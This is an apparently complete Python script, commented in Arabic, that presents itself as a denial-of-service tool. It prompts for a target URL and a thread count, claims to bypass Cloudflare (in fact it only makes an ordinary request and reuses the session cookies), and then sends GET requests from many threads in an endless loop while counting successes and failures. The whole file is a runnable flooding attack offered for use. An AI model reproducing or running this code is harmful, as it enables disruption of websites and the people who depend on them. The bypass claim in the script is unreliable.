
import requests
from concurrent.futures import ThreadPoolExecutor
import threading

# تجاوز حماية Cloudflare باستخدام requests
def bypass_cloudflare(target_url):
    try:
        print("[*] محاولة تجاوز حماية Cloudflare...")
        session = requests.Session()
        response = session.get(target_url, timeout=5)
        
        if response.status_code == 200:
            print("[*] تجاوز الحماية بنجاح!")
            return session.cookies, session.headers
        else:
            print("[!] فشل تجاوز Cloudflare، الكود:", response.status_code)
            return None, None
    except Exception as e:
        print(f"[!] فشل تجاوز Cloudflare: {e}")
        return None, None

# إرسال طلبات DoS
def send_request(session, target_url, counter_lock, request_counter):
    try:
        response = session.get(target_url, timeout=5)
        with counter_lock:
            request_counter[0] += 1
    except requests.exceptions.RequestException:
        with counter_lock:
            request_counter[1] += 1

# تنفيذ هجوم DoS
def perform_dos(target_url, cookies, headers, threads_count):
    print("[*] بدء هجوم DoS...")
    session = requests.Session()
    session.headers.update(headers)
    session.cookies.update(cookies)

    request_counter = [0, 0]  # [عدد الطلبات الناجحة، عدد الطلبات الفاشلة]
    counter_lock = threading.Lock()

    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        while True:
            executor.submit(send_request, session, target_url, counter_lock, request_counter)
            with counter_lock:
                print(f"[*] عدد الطلبات المرسلة: {request_counter[0]}, عدد الطلبات الفاشلة: {request_counter[1]}", end='\r')

# البرنامج الرئيسي
if __name__ == "__main__":
    # طلب الرابط وعدد الخيوط من المستخدم
    target_url = input("أدخل عنوان URL المستهدف (http://example.com): ").strip()
    threads_count = int(input("أدخل عدد الخيوط (Threads): ").strip())

    # تجاوز Cloudflare
    cookies, headers = bypass_cloudflare(target_url)

    if cookies and headers:
        print("[*] بدء الهجوم بعد تجاوز Cloudflare...")
        perform_dos(target_url, cookies, headers, threads_count)
    else:
        print("[!] لم يتم تجاوز حماية Cloudflare، توقف البرنامج.")
